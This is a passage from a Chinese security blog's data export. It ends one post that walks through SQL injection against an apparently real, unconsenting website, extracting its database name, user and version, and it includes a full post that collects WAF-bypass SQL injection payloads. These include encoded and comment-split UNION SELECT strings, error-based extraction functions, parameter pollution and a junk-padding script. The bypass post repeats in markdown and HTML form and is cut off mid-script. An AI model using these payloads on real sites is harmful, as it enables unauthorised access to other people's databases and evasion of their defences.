title=\"显错注入具体流程\"></a>显错注入具体流程</h2><p>1.看到了warning，也就是说这个网站存在sql注入，先在%27后面加个空格，加个%23（%23通过url解码为#，起到注释的作用），新的url传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=243&#x27; #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-36.png\" alt=\"upload successful\"></p>\n<p>2.可以看到，闭合成功了，页面返回正常，这个时候，就是猜字段了，在单引号和#之间放入order by 数字，猜字段<br>当前传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=243&#x27; order by 1 #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-37.png\" alt=\"upload successful\"></p>\n<p>3.根据之前的教学推文中知道，接下来就是通过order by 判断当前数据库字段数了，order by 1页面正常，order by 2 页面正常……一直到order by 29的时候，页面又出现了错误，下面的文字内容没了，所以我们知道，字段数为28。当前url传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=243&#x27; order by 29 #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-38.png\" alt=\"upload successful\"></p>\n<p>4.字段知道了，接下来就是联合查询了，获取了显错点4，6，13。（ps:这里有个坑，243变成了-243，这是为了让联合查询前面的语句报错，这样就会输出后面的显错点了，跟limit 1,1 更换显示为第2行道理相同）<br>当前url传参为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=-243&#x27; union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28 #</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/pasted-39.png\" alt=\"upload successful\"></p>\n<p>5.有了显错点，已经可以说是找到漏洞了，我们偷偷看看它的数据库，将4，6，13换成之间推文里提到的函数，获取数据库库名，数据库当前用户名，数据库版本号。</p>\n<p><img src=\"/images/pasted-40.png\" alt=\"upload successful\"></p>\n<p>6.这里我打码了一部分，数据库库名开头为ao ，数据库当前用户名为ao***@localhost，数据库当前版本为5.5.45。本次实例就到这里，点到为止嘛，查到库名已经可以去漏洞提交平台进行提交了。本次实例仅作为学习资料，若有出现打码遗漏等问题，也请大家不要对网站进行攻击。</p>\n"},{"title":"干货：SQL注入如何绕过WAF","keywords":"sql注入,WAF,绕过","description":"学习sql注入遇到waf的情况下如何进行绕过","cover":"/images/sql.jpeg","date":"2020-05-12T11:05:13.000Z","_content":"\n在进行渗透测试的时候，各式各样的waf层出不穷，阻拦了我们渗透测试的步伐。为了让大家少走一些弯路，我特地为大家出一篇文章，教大家如何绕过waf。\n\n # 几种WAF的图片\n![upload successful](/images/pasted-60.png)\n\n![upload successful](/images/pasted-61.png)\n\n![upload successful](/images/pasted-62.png)\n\n这就是waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。对于刚接触渗透测试的我来说，辛酸泪历史已经可以写一本书了，书名叫“那些年拦截住我的waf”。\n\n首先对于我们来说，需要知道一点，对于网站来说，在我们能力水平有限的情况下，是存在waf无法绕过的情况，这是很正常的，如果遇到实在过不去的 waf，该放弃时还是放弃吧。\n\nWaf对于我来说，也就是规则，通俗点就是这个结构:\n```\nif(xxx){\n\t拦截！\n}else{\n\t通过\n}\n```\n也就是说，我们只需要让它同意我们的操作，即绕过了waf。\n\n通常的waf一般可以有以下绕过方法：\n# 1.\t大小写绕过\n\n（现在基本上遇不到了，不过也可以了解一下）\n\n```\nid=1 and UnIoN sElEcT 1,2,3\nid=1 OrDeR By 1\n```\n# 2.\t双写绕过\n\n（原理是一些防护措施只进行一次，可以通过双写关键字的方法绕过）\n\n```\nid=1 ununionion selselectect 1,2,3 \t删除一次--> union select 1,2,3\nid=1 ororderder bbyy\t1\t删除一次--> order by 1\n```\n# 3.\t编码绕过\n\n（如果检测的是关键字，那么经过编码即可绕过）\n\nURL全编码：http://web.chacuo.net/charseturlencode\n![upload successful](/images/pasted-64.png)\n十六进制：https://www.bejson.com/convert/ox2str/\n![upload successful](/images/pasted-65.png)\n\n>ps：使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识。这个方法用在不能使用引号时挺好的。\n\n---\n# 4.\t基本符号替换\n>用&&替换and\t\n>用||替换or\t\n>用/**/替换空格\t\n>URL栏中用+替换空格\t\n\n# 5.\t报错注入替换函数绕过\n\n（网站只检测一部分热门的函数，不检测一些冷门的函数）\n\n全部以select user() 为例：\n### 1.floor()\n```\nid = 1 and (select 1 from  (select count(*),concat(user(),floor(rand(0)*2))x from  information_schema.tables group by x)a)\n```\n### 2.extractvalue()\n```\nid = 1 and extractvalue(1, concat(0x7e,(select user())))\nid = 1 and extractvalue(1,concat(char(126),database()))\n```\n### 3.updatexml()\n```\nid = 1 and updatexml(1,concat(0x7e,(select user())),1)\n```\n### 4.exp()\n```\nexp(~(select * from(select user()))a))\n```\n### 5.总体可以归为一处的函数\n(1)\tGeometryCollection()\n```\nid = 1 AND GeometryCollection((select * from (select * from(select user())a)b))\n```\n(2)\tpolygon()\n```\nid =1 AND polygon((select * from(select * from(select user())a)b))\n```\n(3)\tmultipoint()\n```\nid = 1 AND multipoint((select * from(select * from(select user())a)b))\n```\n(4)\tmultilinestring()\n```\nid = 1 AND multilinestring((select * from(select * from(select user())a)b))\n```\n(5)\tlinestring()\n```\nid = 1 AND LINESTRING((select * from(select * from(select user())a)b))\n```\n(6)\tmultipolygon()\n```\nid =1 AND multipolygon((select * from(select * from(select user())a)b))\n```\n\n# 6.\t其他等价函数绕过\n>hex()、bin() ==> ascii()\t\n>sleep() ==>benchmark()\t\n>concat_ws()==>group_concat()\t\n>mid()、substr() ==> substring()\t\n>@@user ==> user()\t\n>@@database ==> database()\t\n\n# 7.\t内联注释配合注释绕过\n```\nId=1/**//*! order*/+/*!by*/+1\n```\n# 8.\t%0a换行跳出单行注释绕过\n原理：数据库中对于#和--(空格)后面的东西都进行注释忽略处理\n我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。\nPayload：\n```\nid=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201\nid=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3\n```\n# 9.\t利用一些中间件的缺陷\n1)\tIIS+ASP\n通过在关键词之间加%绕过。\n```\nid=1 and uni%on se%le%ct 1,2,3 from ad%min\n```\n2)\tIIS的Unicode编码\nIIS支持Unicode编码，可以通过编码关键词进行绕过：\nhttp://tool.chinaz.com/tools/unicode.aspx\n![upload successful](/images/pasted-68.png)\n\n3)\tHTTP参数污染\n有的时候，浏览器对于这样的传参会出现以下情况：\n```\nid=1 and id=2 --> 出现在服务器中，id=1,2\n```\n那么我们可以这样绕：\n```\nid=1 and union select username & id= password form admin\n--> id=1 and union select username, password form admin\n```\n对于这种参数重复传参的情况，不同环境有不同结果：\n\n![upload successful](/images/pasted-69.png)\n\n# 10.\t更换传参方式绕过\n在有些情况下，因为 $_REQUEST['id'] 的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了其他传参。\n\n ![upload successful](/images/pasted-70.png)\n\n# 11.\t利用数据提取方式的缺陷进行绕过\nPHP+Apache中，在多参数传参的情况下，某些waf会对传参进行分开验证，我们可以通过分开传参加注释符进行绕过。\n\nExample：\n在PHP+Apache中\t\nx=1&y=2&z=3 在某些waf中会被提取为：\t\nx=1\t\ny=2\t\nz=3\t\npayload:\t\n```\nid=1+union+/*&x=2*/+select/*&y=3*/+1,2,3+from+admin\n```\nwaf检测方式为分别检测三个传参：\t\nid=1+union+/*\t\nx=2*/+select/*\t\ny=3*/1,2,3+from+admin\t\n\n数据库中，/**/中间的东西被过滤了，获得的传参为：\t\n```\nid=1+union++select+1,2,3+from+admin\n```\n# 12.\t脏数据绕过\n在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf，详情可以查看链接:\t\nhttps://cloud.tencent.com/developer/article/1592593\n\n```\n#生成垃圾数据\n#coding=utf-8\nimport random,string\nfrom urllib import parse\nvarname_min = 5\nvarname_max = 15\ndata_min = 20\ndata_max = 25\nnum_min = 50\nnum_max = 100\ndef randstr(length):\n    str_list = [random.choice(string.ascii_letters) for i in range(length)]\n    random_str = ''.join(str_list)\n    return random_str\n\ndef main():\n    data={}\n    for i in range(num_min,num_max):\n        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))\n    print('&'+parse.urlencode(data)+'&')\n\nmain()\n```","source":"_posts/干货：SQL注入如何绕过WAF.md","raw":"---\ntitle: 干货：SQL注入如何绕过WAF\ntags: \n  - web安全\n  - sql注入\n  - WAF绕过\ncategories: web安全\nkeywords: 'sql注入,WAF,绕过'\ndescription: 学习sql注入遇到waf的情况下如何进行绕过\ncover: /images/sql.jpeg\ndate: 2020-05-12 19:05:13\n---\n\n在进行渗透测试的时候，各式各样的waf层出不穷，阻拦了我们渗透测试的步伐。为了让大家少走一些弯路，我特地为大家出一篇文章，教大家如何绕过waf。\n\n # 几种WAF的图片\n![upload successful](/images/pasted-60.png)\n\n![upload successful](/images/pasted-61.png)\n\n![upload successful](/images/pasted-62.png)\n\n这就是waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。对于刚接触渗透测试的我来说，辛酸泪历史已经可以写一本书了，书名叫“那些年拦截住我的waf”。\n\n首先对于我们来说，需要知道一点，对于网站来说，在我们能力水平有限的情况下，是存在waf无法绕过的情况，这是很正常的，如果遇到实在过不去的 waf，该放弃时还是放弃吧。\n\nWaf对于我来说，也就是规则，通俗点就是这个结构:\n```\nif(xxx){\n\t拦截！\n}else{\n\t通过\n}\n```\n也就是说，我们只需要让它同意我们的操作，即绕过了waf。\n\n通常的waf一般可以有以下绕过方法：\n# 1.\t大小写绕过\n\n（现在基本上遇不到了，不过也可以了解一下）\n\n```\nid=1 and UnIoN sElEcT 1,2,3\nid=1 OrDeR By 1\n```\n# 2.\t双写绕过\n\n（原理是一些防护措施只进行一次，可以通过双写关键字的方法绕过）\n\n```\nid=1 ununionion selselectect 1,2,3 \t删除一次--> union select 1,2,3\nid=1 ororderder bbyy\t1\t删除一次--> order by 1\n```\n# 3.\t编码绕过\n\n（如果检测的是关键字，那么经过编码即可绕过）\n\nURL全编码：http://web.chacuo.net/charseturlencode\n![upload successful](/images/pasted-64.png)\n十六进制：https://www.bejson.com/convert/ox2str/\n![upload successful](/images/pasted-65.png)\n\n>ps：使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识。这个方法用在不能使用引号时挺好的。\n\n---\n# 4.\t基本符号替换\n>用&&替换and\t\n>用||替换or\t\n>用/**/替换空格\t\n>URL栏中用+替换空格\t\n\n# 5.\t报错注入替换函数绕过\n\n（网站只检测一部分热门的函数，不检测一些冷门的函数）\n\n全部以select user() 为例：\n### 1.floor()\n```\nid = 1 and (select 1 from  (select count(*),concat(user(),floor(rand(0)*2))x from  information_schema.tables group by x)a)\n```\n### 2.extractvalue()\n```\nid = 1 and extractvalue(1, concat(0x7e,(select user())))\nid = 1 and extractvalue(1,concat(char(126),database()))\n```\n### 3.updatexml()\n```\nid = 1 and updatexml(1,concat(0x7e,(select user())),1)\n```\n### 4.exp()\n```\nexp(~(select * from(select user()))a))\n```\n### 5.总体可以归为一处的函数\n(1)\tGeometryCollection()\n```\nid = 1 AND GeometryCollection((select * from (select * from(select user())a)b))\n```\n(2)\tpolygon()\n```\nid =1 AND polygon((select * from(select * from(select user())a)b))\n```\n(3)\tmultipoint()\n```\nid = 1 AND multipoint((select * from(select * from(select user())a)b))\n```\n(4)\tmultilinestring()\n```\nid = 1 AND multilinestring((select * from(select * from(select user())a)b))\n```\n(5)\tlinestring()\n```\nid = 1 AND LINESTRING((select * from(select * from(select user())a)b))\n```\n(6)\tmultipolygon()\n```\nid =1 AND multipolygon((select * from(select * from(select user())a)b))\n```\n\n# 6.\t其他等价函数绕过\n>hex()、bin() ==> ascii()\t\n>sleep() ==>benchmark()\t\n>concat_ws()==>group_concat()\t\n>mid()、substr() ==> substring()\t\n>@@user ==> user()\t\n>@@database ==> database()\t\n\n# 7.\t内联注释配合注释绕过\n```\nId=1/**//*! order*/+/*!by*/+1\n```\n# 8.\t%0a换行跳出单行注释绕过\n原理：数据库中对于#和--(空格)后面的东西都进行注释忽略处理\n我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。\nPayload：\n```\nid=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201\nid=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3\n```\n# 9.\t利用一些中间件的缺陷\n1)\tIIS+ASP\n通过在关键词之间加%绕过。\n```\nid=1 and uni%on se%le%ct 1,2,3 from ad%min\n```\n2)\tIIS的Unicode编码\nIIS支持Unicode编码，可以通过编码关键词进行绕过：\nhttp://tool.chinaz.com/tools/unicode.aspx\n![upload successful](/images/pasted-68.png)\n\n3)\tHTTP参数污染\n有的时候，浏览器对于这样的传参会出现以下情况：\n```\nid=1 and id=2 --> 出现在服务器中，id=1,2\n```\n那么我们可以这样绕：\n```\nid=1 and union select username & id= password form admin\n--> id=1 and union select username, password form admin\n```\n对于这种参数重复传参的情况，不同环境有不同结果：\n\n![upload successful](/images/pasted-69.png)\n\n# 10.\t更换传参方式绕过\n在有些情况下，因为 $_REQUEST['id'] 的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了其他传参。\n\n ![upload successful](/images/pasted-70.png)\n\n# 11.\t利用数据提取方式的缺陷进行绕过\nPHP+Apache中，在多参数传参的情况下，某些waf会对传参进行分开验证，我们可以通过分开传参加注释符进行绕过。\n\nExample：\n在PHP+Apache中\t\nx=1&y=2&z=3 在某些waf中会被提取为：\t\nx=1\t\ny=2\t\nz=3\t\npayload:\t\n```\nid=1+union+/*&x=2*/+select/*&y=3*/+1,2,3+from+admin\n```\nwaf检测方式为分别检测三个传参：\t\nid=1+union+/*\t\nx=2*/+select/*\t\ny=3*/1,2,3+from+admin\t\n\n数据库中，/**/中间的东西被过滤了，获得的传参为：\t\n```\nid=1+union++select+1,2,3+from+admin\n```\n# 12.\t脏数据绕过\n在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf，详情可以查看链接:\t\nhttps://cloud.tencent.com/developer/article/1592593\n\n```\n#生成垃圾数据\n#coding=utf-8\nimport random,string\nfrom urllib import parse\nvarname_min = 5\nvarname_max = 15\ndata_min = 20\ndata_max = 25\nnum_min = 50\nnum_max = 100\ndef randstr(length):\n    str_list = [random.choice(string.ascii_letters) for i in range(length)]\n    random_str = ''.join(str_list)\n    return random_str\n\ndef main():\n    data={}\n    for i in range(num_min,num_max):\n        data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))\n    print('&'+parse.urlencode(data)+'&')\n\nmain()\n```","slug":"干货：SQL注入如何绕过WAF","published":1,"updated":"2021-08-07T16:19:27.491Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfj0011vkq3dhae2xlx","content":"<p>在进行渗透测试的时候，各式各样的waf层出不穷，阻拦了我们渗透测试的步伐。为了让大家少走一些弯路，我特地为大家出一篇文章，教大家如何绕过waf。</p>\n<h1 id=\"几种WAF的图片\"><a href=\"#几种WAF的图片\" class=\"headerlink\" title=\"几种WAF的图片\"></a>几种WAF的图片</h1><p><img src=\"/images/pasted-60.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-61.png\" alt=\"upload successful\"></p>\n<p><img src=\"/images/pasted-62.png\" alt=\"upload successful\"></p>\n<p>这就是waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。对于刚接触渗透测试的我来说，辛酸泪历史已经可以写一本书了，书名叫“那些年拦截住我的waf”。</p>\n<p>首先对于我们来说，需要知道一点，对于网站来说，在我们能力水平有限的情况下，是存在waf无法绕过的情况，这是很正常的，如果遇到实在过不去的 waf，该放弃时还是放弃吧。</p>\n<p>Waf对于我来说，也就是规则，通俗点就是这个结构:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(xxx)&#123;</span><br><span class=\"line\">\t拦截！</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\t通过</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>也就是说，我们只需要让它同意我们的操作，即绕过了waf。</p>\n<p>通常的waf一般可以有以下绕过方法：</p>\n<h1 id=\"1-大小写绕过\"><a href=\"#1-大小写绕过\" class=\"headerlink\" title=\"1.    大小写绕过\"></a>1.    大小写绕过</h1><p>（现在基本上遇不到了，不过也可以了解一下）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and UnIoN sElEcT 1,2,3</span><br><span class=\"line\">id=1 OrDeR By 1</span><br></pre></td></tr></table></figure>\n<h1 id=\"2-双写绕过\"><a href=\"#2-双写绕过\" class=\"headerlink\" title=\"2.    双写绕过\"></a>2.    双写绕过</h1><p>（原理是一些防护措施只进行一次，可以通过双写关键字的方法绕过）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 ununionion selselectect 1,2,3 \t删除一次--&gt; union select 1,2,3</span><br><span class=\"line\">id=1 ororderder bbyy\t1\t删除一次--&gt; order by 1</span><br></pre></td></tr></table></figure>\n<h1 id=\"3-编码绕过\"><a href=\"#3-编码绕过\" class=\"headerlink\" title=\"3.    编码绕过\"></a>3.    编码绕过</h1><p>（如果检测的是关键字，那么经过编码即可绕过）</p>\n<p>URL全编码：<a href=\"http://web.chacuo.net/charseturlencode\">http://web.chacuo.net/charseturlencode</a><br><img src=\"/images/pasted-64.png\" alt=\"upload successful\"><br>十六进制：<a href=\"https://www.bejson.com/convert/ox2str/\">https://www.bejson.com/convert/ox2str/</a><br><img src=\"/images/pasted-65.png\" alt=\"upload successful\"></p>\n<blockquote>\n<p>ps：使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识。这个方法用在不能使用引号时挺好的。</p>\n</blockquote>\n<hr>\n<h1 id=\"4-基本符号替换\"><a href=\"#4-基本符号替换\" class=\"headerlink\" title=\"4.    基本符号替换\"></a>4.    基本符号替换</h1><blockquote>\n<p>用&amp;&amp;替换and<br>用||替换or<br>用/**/替换空格<br>URL栏中用+替换空格    </p>\n</blockquote>\n<h1 id=\"5-报错注入替换函数绕过\"><a href=\"#5-报错注入替换函数绕过\" class=\"headerlink\" title=\"5.    报错注入替换函数绕过\"></a>5.    报错注入替换函数绕过</h1><p>（网站只检测一部分热门的函数，不检测一些冷门的函数）</p>\n<p>全部以select user() 为例：</p>\n<h3 id=\"1-floor\"><a href=\"#1-floor\" class=\"headerlink\" title=\"1.floor()\"></a>1.floor()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 and (select 1 from  (select count(*),concat(user(),floor(rand(0)*2))x from  information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-extractvalue\"><a href=\"#2-extractvalue\" class=\"headerlink\" title=\"2.extractvalue()\"></a>2.extractvalue()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 and extractvalue(1, concat(0x7e,(select user())))</span><br><span class=\"line\">id = 1 and extractvalue(1,concat(char(126),database()))</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-updatexml\"><a href=\"#3-updatexml\" class=\"headerlink\" title=\"3.updatexml()\"></a>3.updatexml()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 and updatexml(1,concat(0x7e,(select user())),1)</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-exp\"><a href=\"#4-exp\" class=\"headerlink\" title=\"4.exp()\"></a>4.exp()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exp(~(select * from(select user()))a))</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-总体可以归为一处的函数\"><a href=\"#5-总体可以归为一处的函数\" class=\"headerlink\" title=\"5.总体可以归为一处的函数\"></a>5.总体可以归为一处的函数</h3><p>(1)    GeometryCollection()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(2)    polygon()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id =1 AND polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(3)    multipoint()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(4)    multilinestring()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(5)    linestring()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n<p>(6)    multipolygon()</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id =1 AND multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"6-其他等价函数绕过\"><a href=\"#6-其他等价函数绕过\" class=\"headerlink\" title=\"6.    其他等价函数绕过\"></a>6.    其他等价函数绕过</h1><blockquote>\n<p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@database ==&gt; database()    </p>\n</blockquote>\n<h1 id=\"7-内联注释配合注释绕过\"><a href=\"#7-内联注释配合注释绕过\" class=\"headerlink\" title=\"7.    内联注释配合注释绕过\"></a>7.    内联注释配合注释绕过</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Id=1/**//*! order*/+/*!by*/+1</span><br></pre></td></tr></table></figure>\n<h1 id=\"8-0a换行跳出单行注释绕过\"><a href=\"#8-0a换行跳出单行注释绕过\" class=\"headerlink\" title=\"8.    %0a换行跳出单行注释绕过\"></a>8.    %0a换行跳出单行注释绕过</h1><p>原理：数据库中对于#和–(空格)后面的东西都进行注释忽略处理<br>我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。<br>Payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201</span><br><span class=\"line\">id=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3</span><br></pre></td></tr></table></figure>\n<h1 id=\"9-利用一些中间件的缺陷\"><a href=\"#9-利用一些中间件的缺陷\" class=\"headerlink\" title=\"9.    利用一些中间件的缺陷\"></a>9.    利用一些中间件的缺陷</h1><ol>\n<li><p>   IIS+ASP<br>通过在关键词之间加%绕过。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and uni%on se%le%ct 1,2,3 from ad%min</span><br></pre></td></tr></table></figure></li>\n<li><p>   IIS的Unicode编码<br>IIS支持Unicode编码，可以通过编码关键词进行绕过：<br><a href=\"http://tool.chinaz.com/tools/unicode.aspx\">http://tool.chinaz.com/tools/unicode.aspx</a><br><img src=\"/images/pasted-68.png\" alt=\"upload successful\"></p>\n</li>\n<li><p>   HTTP参数污染<br>有的时候，浏览器对于这样的传参会出现以下情况：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and id=2 --&gt; 出现在服务器中，id=1,2</span><br></pre></td></tr></table></figure>\n<p>那么我们可以这样绕：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1 and union select username &amp; id= password form admin</span><br><span class=\"line\">--&gt; id=1 and union select username, password form admin</span><br></pre></td></tr></table></figure>\n<p>对于这种参数重复传参的情况，不同环境有不同结果：</p>\n</li>\n</ol>\n<p><img src=\"/images/pasted-69.png\" alt=\"upload successful\"></p>\n<h1 id=\"10-更换传参方式绕过\"><a href=\"#10-更换传参方式绕过\" class=\"headerlink\" title=\"10.    更换传参方式绕过\"></a>10.    更换传参方式绕过</h1><p>在有些情况下，因为 $_REQUEST[‘id’] 的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了其他传参。</p>\n<p> <img src=\"/images/pasted-70.png\" alt=\"upload successful\"></p>\n<h1 id=\"11-利用数据提取方式的缺陷进行绕过\"><a href=\"#11-利用数据提取方式的缺陷进行绕过\" class=\"headerlink\" title=\"11.    利用数据提取方式的缺陷进行绕过\"></a>11.    利用数据提取方式的缺陷进行绕过</h1><p>PHP+Apache中，在多参数传参的情况下，某些waf会对传参进行分开验证，我们可以通过分开传参加注释符进行绕过。</p>\n<p>Example：<br>在PHP+Apache中<br>x=1&amp;y=2&amp;z=3 在某些waf中会被提取为：<br>x=1<br>y=2<br>z=3<br>payload:    </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1+union+/*&amp;x=2*/+select/*&amp;y=3*/+1,2,3+from+admin</span><br></pre></td></tr></table></figure>\n<p>waf检测方式为分别检测三个传参：<br>id=1+union+/*<br>x=2*/+select/*<br>y=3*/1,2,3+from+admin    </p>\n<p>数据库中，/**/中间的东西被过滤了，获得的传参为：    </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1+union++select+1,2,3+from+admin</span><br></pre></td></tr></table></figure>\n<h1 id=\"12-脏数据绕过\"><a href=\"#12-脏数据绕过\" class=\"headerlink\" title=\"12.    脏数据绕过\"></a>12.    脏数据绕过</h1><p>在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf，详情可以查看链接:<br><a href=\"https://cloud.tencent.com/developer/article/1592593\">https://cloud.tencent.com/developer/article/1592593</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#生成垃圾数据</span><br><span class=\"line\">#coding=utf-8</span><br><span class=\"line\">import random,string</span><br><span class=\"line\">from urllib import parse</span><br><span class=\"line\">varname_min = 5</span><br><span class=\"line\">varname_max = 15</span><br><span class=\"line\">data_min = 20</span><br><span class=\"line\">data_max = 25</span><br><span class=\"line\">num_min = 50</span><br><span class=\"line\">num_max = 100</span><br><span class=\"line\">def randstr(length):</span><br><span class=\"line\">    str_list = [random.choice(string.ascii_letters) for i 